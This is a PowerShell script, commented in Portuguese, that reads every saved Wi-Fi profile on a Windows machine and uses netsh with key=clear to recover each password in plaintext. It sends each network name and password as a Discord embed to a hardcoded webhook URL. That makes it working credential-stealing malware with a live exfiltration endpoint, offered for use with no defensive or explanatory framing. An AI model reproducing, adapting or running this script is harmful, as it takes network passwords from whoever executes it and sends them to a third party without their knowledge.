$Webhook="https://discord.com/api/webhooks/1391925819017793566/P6u2qHAbmqSFeu94T1beCpyWBO6khVVdCK66sy8a083xDZqRSyY5w5PDHDciVnh2ImDB"
$profiles=netsh wlan show profile | ForEach-Object { ($_ -split ':')[1].Trim() }

foreach ($p in $profiles) {
    $details=netsh wlan show profile name="$p" key=clear
    $passLine=$details | Select-String "Key Content|Contenuto chiave|Inhaltsschl|Contenido de la clave"
    
    if ($passLine) { 
        $password=($passLine -split ':')[1].Trim() 
    } else { 
        $password='[Sem senha / não encontrado]' 
    }
    $embed = @{
        title = "📶 Rede Wi-Fi Detectada"
        description = "Informações da rede salva"
        color = 5814783  # Cor azul em decimal
        fields = @(
            @{
                name = "Nome da Rede (SSID)"
                value = "```$p```"
                inline = $true
            },
            @{
                name = "Senha"
                value = "```$password```"
                inline = $true
            }
        )
        thumbnail = @{
            url = "https://cdn-icons-png.flaticon.com/512/284/284687.png"
        }
        footer = @{
            text = "Scan realizado em $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')"
        }
        timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ss.fffZ"
    }
    
    $payload = @{
        embeds = @($embed)
        username = "Wi-Fi Scanner"
        avatar_url = "https://cdn-icons-png.flaticon.com/512/284/284687.png"
    }
    
    $json = $payload | ConvertTo-Json -Depth 10
    Invoke-RestMethod -Uri $Webhook -Method Post -Body $json -ContentType "application/json"
    
    Start-Sleep -Milliseconds 500
}
